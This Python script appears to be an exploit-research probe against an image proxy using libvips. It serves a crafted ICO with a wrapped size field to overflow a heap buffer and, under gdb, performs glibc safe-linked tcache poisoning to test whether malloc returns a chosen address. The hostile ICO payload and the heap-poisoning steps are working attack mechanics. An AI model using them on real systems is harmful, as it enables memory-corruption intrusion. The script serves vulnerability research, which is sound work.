#!/usr/bin/env python3
"""W6: measure whether safe-linked tcache poisoning yields a chosen allocation.

Usage: ico_gdb_tcache.py BINARY LIBDIR TAG PRELOAD_COUNT TARGET_HEX [GDB_WAIT]

Serves a benign favicon and the hostile ICO on 127.0.0.1:18081, runs BINARY
under gdb on 127.0.0.1:18080, sends PRELOAD_COUNT benign GETs then one hostile
GET.  At the wrapped-size read_full breakpoint this probe reads the live tcache
`next` field at actual_data+18, decodes it with glibc 2.39 safe-linking
(pos >> 12), patches the same field with TARGET encoded for that live position,
and calls malloc(0x20) twice from the inferior to measure what the poisoned bin
head returns.  The patch and the malloc calls are debugger-forced mechanics:
only the ICO body bytes arrive over the wire.  No r5 claim is made here.
"""
import http.client
import http.server
import os
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

SRC_HOST, SRC_PORT = "127.0.0.1", 18081
PROXY_HOST, PROXY_PORT = "127.0.0.1", 18080
HERE = os.path.dirname(os.path.abspath(__file__))

# 64-byte body: preserve the victim size field (0x35) and leave a placeholder
# tcache next; the probe patches next with an encoded target under gdb.
BODY = bytearray(64)
BODY[0:10] = bytes([0x5A, 0x5B, 0x5C, 0x5D] * 2) + bytes([0x5A, 0x5B])
BODY[10:18] = struct.pack("<Q", 0x35)
BODY[18:26] = struct.pack("<Q", 0x4141414141414141)
BODY[26:64] = bytes([0x5A, 0x5B, 0x5C, 0x5D] * 9) + bytes([0x5A])
HOSTILE_ICO = (b"\x00\x00\x01\x00\x01\x00" +
               struct.pack("<BBBBHHII", 1, 1, 0, 0, 1, 32, 0xFFFFFFF5, 22) +
               bytes(BODY))

with open(os.path.join(HERE, "ico_benign.ico"), "rb") as _f:
    BENIGN_ICO = _f.read()

GDB_BODY = """set pagination off
set confirm off
set unwind-on-signal on
set breakpoint pending on
handle SIGPIPE nostop noprint pass
set environment IMGPROXY_BIND {bind}
set environment IMGPROXY_BASE_URL http://{src}:{srcport}/
set environment IMGPROXY_WORKERS 1
set environment IMGPROXY_CONCURRENCY 1
set environment IMGPROXY_LOG_LEVEL error
set environment IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES true
set environment LD_LIBRARY_PATH {libdir}
break vips_foreign_load_read_full if $rdx == 0xfffffff5
run
printf "W6_HIT len=%p buf=%p\\n", $rdx, $rsi
set $pos = (unsigned long)($rsi + 18)
printf "W6_WIRE next_after_body=%p size=%p\\n", *(unsigned long*)$pos, *(unsigned long*)($pos-8)
set *(unsigned long*)$pos = (({target}) ^ ($pos >> 12))
printf "W6_PATCHED next=%p encoded_from=%p\\n", *(unsigned long*)$pos, ({target})
set $m1 = (unsigned long)malloc(0x20)
printf "W6_M1 %p\\n", $m1
printf "W6_TCACHE entry1=%p count1=%d\\n", tcache->entries[1], tcache->counts[1]
catch signal SIGSEGV
commands
silent
printf "W6_FAULT addr=%p rip=%p rdi=%p rsi=%p\\n", $_siginfo->si_addr, $rip, $rdi, $rsi
bt 5
quit
end
set $m2 = (unsigned long)malloc(0x20)
printf "W6_M2 %p\\n", $m2
printf "W6_TARGET_BYTES\\n"
x/4gx ({target})
quit
"""


class Source(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = BENIGN_ICO if self.path == "/benign.ico" else HOSTILE_ICO
        self.send_response(200)
        self.send_header("Content-Type", "image/x-icon")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass



def wait_port(host, port, seconds=20.0):
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        try:
            with socket.create_connection((host, port), 0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def get(path, timeout):
    conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=timeout)
    try:
        conn.request("GET", "/insecure/" + path, headers={"Host": PROXY_HOST})
        resp = conn.getresponse()
        return resp.status, resp.read(300).decode("utf-8", "replace")
    finally:
        conn.close()


def main():
    binary, libdir, tag, preload, target_expr = sys.argv[1:6]
    preload = int(preload)
    gdb_wait = float(sys.argv[6]) if len(sys.argv) > 6 else 45.0


    fd, cmdpath = tempfile.mkstemp(prefix=f"ico-tcache-{tag}-", suffix=".cmd")
    with os.fdopen(fd, "w") as f:
        f.write(GDB_BODY.format(bind=f"{PROXY_HOST}:{PROXY_PORT}",
                                src=SRC_HOST, srcport=SRC_PORT,
                                libdir=os.path.abspath(libdir),
                                target=target_expr))

    logpath = os.path.join(HERE, f"http-ico-{tag}.log")
    srv = http.server.ThreadingHTTPServer((SRC_HOST, SRC_PORT), Source)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    gdb = subprocess.Popen(
        ["gdb", "-batch", "-x", cmdpath, binary],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    results = []
    try:
        if not wait_port(PROXY_HOST, PROXY_PORT):
            print(f"ICO_TCACHE tag={tag} PROXY_LISTEN=FAIL", flush=True)
            return 2
        for i in range(preload):
            try:
                st, body = get("rs:fill:16:16/plain/benign.ico", 10.0)
                results.append(f"benign[{i}]={st}:{body[:60]!r}")
            except Exception as exc:
                results.append(f"benign[{i}]={type(exc).__name__}:{exc}")
        try:
            st, body = get("rs:fill:16:16/plain/hostile.ico", 10.0)
            results.append(f"hostile={st}:{body[:120]!r}")
        except Exception as exc:
            results.append(f"hostile={type(exc).__name__}:{exc}")
        print(f"ICO_TCACHE tag={tag} target={target_expr} preload={preload} " +
              " ".join(results), flush=True)
    finally:
        try:
            out, _ = gdb.communicate(timeout=gdb_wait)
        except subprocess.TimeoutExpired:
            gdb.kill()
            out, _ = gdb.communicate()
        with open(logpath, "w") as f:
            f.write(f"CLIENT target={target_expr} preload={preload} " +
                    " ".join(results) + "\n")
            f.write("=== GDB OUTPUT ===\n")
            f.write(out)
        for line in out.splitlines():
            if line.startswith(("W6_", "Breakpoint 1", "0x")):
                print(f"ICO_TCACHE_LOG {line[:400]}", flush=True)
        srv.shutdown()
        srv.server_close()
        os.unlink(cmdpath)
    return 0


if __name__ == "__main__":
    sys.exit(main())
